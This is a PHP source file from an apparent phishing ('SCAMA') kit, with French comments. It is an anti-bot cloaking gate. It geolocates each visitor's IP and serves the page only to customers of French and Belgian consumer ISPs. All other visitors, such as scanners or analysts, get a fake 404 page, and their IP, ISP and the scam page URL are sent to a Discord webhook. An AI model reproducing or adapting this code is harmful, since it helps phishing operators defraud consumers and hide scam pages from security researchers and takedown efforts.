<?php
session_start();

$webhook_ipblockees = "https://discord.com/api/webhooks/979376709101051924/webhook";

$ip = $_SERVER['REMOTE_ADDR'];
function getIpInfo($ip = '') {
     $ipinfo = file_get_contents("http://ip-api.com/json/".$ip);
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}
    $visitor_ip = $_SERVER['REMOTE_ADDR'];
    $ipinfo_json = getIpInfo($visitor_ip);
	if($ipinfo_json['status'] != 'fail'){

		$org = "{$ipinfo_json['as']}"; // On récupère l'oprateur
		$isps = "{$ipinfo_json['isp']}"; // La mem 
	
	  }
	  else{
	
		$org = "Introuvable";
		$isps = "Introuvable";
	
	  }



if(strpos(strtolower($org),"bouygues") || strpos(strtolower($org),"orange") || strpos(strtolower($org),"sfr") || strpos(strtolower($org),"free") || strpos(strtolower($org),"wanadoo") || strpos(strtolower($org),"proximus") || strpos(strtolower($org),"telenet") || strpos(strtolower($org),"scarlet") || strpos(strtolower($org),"base") || strpos(strtolower($org),"VOO") || strpos(strtolower($org),"Lycamobile") || strpos(strtolower($org),"Pandora") || strpos(strtolower($org),"Viking") || $ip == "::1")
{

	

}
else
{
	 $entetedc = [ 'Content-Type: application/json; charset=utf-8' ];
			$POST = [ 'username' => 'ANTIBOTS', 'content' => '
⛔ ACCES BLOQUÉ MIAUW GG ⛔ 

🌐 ISP : '.$isps.'
🌐 ADRESSE IP : '.$ip.'

🚀 SCAMA : .'.$_SERVER['HTTP_HOST'].'.'.$_SERVER['PHP_SELF'].'


			' ];

			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $webhook_ipblockees);
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_HTTPHEADER, $entetedc);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
			$reponse   = curl_exec($ch);

	
    header("HTTP/1.0 404 Not Found");
	die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
	
         
}




?>